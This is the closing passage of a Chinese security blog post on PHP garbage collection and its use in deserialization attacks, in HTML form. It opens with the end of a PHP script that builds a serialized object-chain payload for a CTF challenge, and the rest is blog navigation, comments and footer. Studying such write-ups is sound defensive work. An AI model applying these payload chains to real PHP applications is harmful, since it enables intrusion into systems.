+<span class="token variable">$a</span><span class="token operator">-></span><span class="token keyword type-declaration">object</span><span class="token operator">-></span><span class="token property">filename</span><span class="token operator">-></span><span class="token keyword type-declaration">object</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">third</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"string"</span><span class="token operator">=></span><span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">one</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"MeMeMe"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+得到payload</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="0x05-小结"><a href="#0x05-小结" class="headerlink" title="0x05 小结"></a>0x05 小结</h2><p>实战很重要。</p>
+
+            </div>
+
+            
+                <div class="post-copyright-info">
+                    
+<div class="article-copyright-info-container">
+    <ul class="copyright-info-content">
+        <li class="post-title">
+            <span class="type">本文标题</span>：<span class="content">PHP GC 回收机制学习</span>
+        </li>
+        <li class="post-author">
+            <span class="type">本文作者</span>：<span class="content">Drunkbaby</span>
+        </li>
+        <li class="post-time">
+            <span class="type">创建时间</span>：<span class="content">2022-11-13 21:23:43</span>
+        </li>
+        <li class="post-link">
+            <span class="type">本文链接</span>：<span class="content">2022/11/13/PHP-GC-回收机制学习/</span>
+        </li>
+        <li class="post-license">
+            <span class="type">版权声明</span>：<span class="content">本博客所有文章除特别声明外，均采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> 许可协议。转载请注明出处！</span>
+        </li>
+    </ul>
+    <div class="copy-copyright-info flex-center tooltip" data-content="复制版权信息" data-offset-y="-2px">
+        <i class="fa-solid fa-copy"></i>
+    </div>
+</div>
+
+                </div>
+            
+
+            
+                <ul class="post-tags-box">
+                    
+                        <li class="tag-item">
+                            <a href="/tags/PHP/">#PHP</a>&nbsp;
+                        </li>
+                    
+                </ul>
+            
+
+            
+                <div class="article-nav">
+                    
+                        <div class="article-prev">
+                            <a class="prev"
+                               rel="prev"
+                               href="/2022/11/28/CVE-2015-4852-WebLogic-T3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/"
+                            >
+                            <span class="left arrow-icon flex-center">
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                                <span class="title flex-center">
+                                <span class="post-nav-title-item">CVE-2015-4852 WebLogic T3 反序列化分析</span>
+                                <span class="post-nav-item">上一篇</span>
+                            </span>
+                            </a>
+                        </div>
+                    
+                    
+                        <div class="article-next">
+                            <a class="next"
+                               rel="next"
+                               href="/2022/11/07/Java-OWASP-SSTI-%E5%AD%A6%E4%B9%A0/"
+                            >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">Java OWASP SSTI 学习</span>
+                                <span class="post-nav-item">下一篇</span>
+                            </span>
+                                <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                            </a>
+                        </div>
+                    
+                </div>
+            
+
+            
+                <div class="comment-container">
+                    
+<div class="comments-container">
+    <div id="comments-anchor"></div>
+    <div class="comment-area-title">
+        <i class="fas fa-comments"></i>&nbsp;评论
+    </div>
+    
+        
+            
+
+    <div class="valine-container">
+        <script data-pjax src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script>
+        <div id="vcomments"></div>
+        <script data-pjax>
+          function loadValine() {
+
+            const config = {
+              el: '#vcomments',
+              appId: 'mCIu9X4iLP3I0GikUoetB9bV-9Nh9j0Va',
+              appKey: 'ermlV1eoB1YODT088EdXjo6C',
+              meta: ['nick', 'mail', 'link'],
+              avatar: 'wavatar',
+              enableQQ: true,
+              placeholder: 'just go go',
+              lang: 'zh-CN'.toLowerCase()
+            }
+
+            if ('') {
+              config.serverURLs = ''
+            }
+
+            new Valine(config)
+
+            function getAuthor(language) {
+              switch (language) {
+                case 'en':
+                  return 'Author'
+                case 'zh-CN':
+                  return '博主'
+                default:
+                  return 'Master'
+              }
+            }
+
+            // Add "Author" identify
+            const getValineDomTimer = setInterval(() => {
+              const vcards = document.querySelectorAll('#vcomments .vcards .vcard')
+              if (vcards.length > 0) {
+                let author = 'Drunkbaby'
+
+                if (author) {
+                  for (let vcard of vcards) {
+                    const vnick_dom = vcard.querySelector('.vhead .vnick')
+                    const vnick = vnick_dom.innerHTML
+                    if (vnick === author) {
+                      vnick_dom.innerHTML = `${vnick} <span class="author">${getAuthor(KEEP.hexo_config.language)}</span>`
+                    }
+                  }
+                }
+                clearInterval(getValineDomTimer)
+              } else {
+                clearInterval(getValineDomTimer)
+              }
+            }, 2000)
+          }
+
+          if ('true' === 'true') {
+            const loadValineTimeout = setTimeout(() => {
+              loadValine()
+              clearTimeout(loadValineTimeout)
+            }, 1000)
+          } else {
+            window.addEventListener('DOMContentLoaded', loadValine)
+          }
+        </script>
+    </div>
+
+
+
+        
+    
+</div>
+
+                </div>
+            
+        </div>
+
+        
+            <div class="toc-content-container">
+                <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#PHP-GC-%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0"><span class="nav-text">PHP GC 回收机制学习</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E5%89%8D%E8%A8%80"><span class="nav-text">0x01 前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-PHP-GC-%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6%E6%98%AF%E4%BB%80%E4%B9%88"><span class="nav-text">0x02 PHP GC 回收机制是什么</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#PHP-%E5%BC%95%E7%94%A8%E8%AE%A1%E6%95%B0"><span class="nav-text">PHP 引用计数</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-PHP-GC-%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6%E6%94%BB%E5%87%BB%E9%9D%A2"><span class="nav-text">0x03 PHP GC 回收机制攻击面</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#PHP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%AD%E7%9A%84-PHP-GC-%E5%88%A9%E7%94%A8"><span class="nav-text">PHP 反序列化中的 PHP GC 利用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#unset-%E7%9B%B4%E6%8E%A5%E5%8F%96%E6%B6%88%E5%BC%95%E7%94%A8"><span class="nav-text">unset 直接取消引用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%BD%93%E4%B8%AD%E5%8F%96%E6%B6%88%E5%BC%95%E7%94%A8"><span class="nav-text">反序列化当中取消引用</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#GC-%E5%9C%A8-Phar-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%AD%E7%9A%84%E5%88%A9%E7%94%A8"><span class="nav-text">GC 在 Phar 反序列化中的利用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-%E5%AE%9E%E6%88%98%E4%BE%8B%E9%A2%98"><span class="nav-text">0x04 实战例题</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Demo"><span class="nav-text">Demo</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CTFShow-%E5%8D%B7%E7%8E%8B%E6%9D%AF-easy-unserialize"><span class="nav-text">CTFShow 卷王杯 easy unserialize</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-%E5%B0%8F%E7%BB%93"><span class="nav-text">0x05 小结</span></a></li></ol></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            
+<footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+                <span>2021</span> -
+            
+            2023
+            
+                &nbsp;<i class="fas fa-heart icon-animate"></i>
+                &nbsp;<a href="/">Drunkbaby</a>
+            
+        </div>
+        
+            <script async data-pjax
+                    src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    访问人数&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
+                
+                
+                    总访问量&nbsp;<span id="busuanzi_value_site_pv"></span>
+                
+            </div>
+        
+        <div class="theme-info info-item">
+            由 <a target="_blank" href="https://hexo.io">Hexo</a> 驱动&nbsp;|&nbsp;主题&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.6.1</a>
+        </div>
+        
+        
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+            <li class="tools-item flex-center go-to-comments">
+                <i class="fas fa-comment"></i>
+                <span class="post-comments-count"></span>
+            </li>
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="fas fa-arrow-up"></i>
+            </li>
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+
+<script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/dark-light-toggle.js"></script>
+
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/local-search.js"></script>
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/code-block.js"></script>
+
+
+
+
+<div class="post-scripts pjax">
+    
+        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/post-helper.js"></script>
+        
+            <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/libs/anime.min.js"></script>
+        
+        
+            <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/toc.js"></script>
+        
+    
+</div>
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/libs/pjax.min.js"></script>
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+            // scrollTo: true,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            KEEP.utils.pjaxProgressBarStart();
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            KEEP.utils.pjaxProgressBarEnd();
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
+            KEEP.refresh();
+        });
+    });
+</script>
+
+
+
+</body>
+</html>
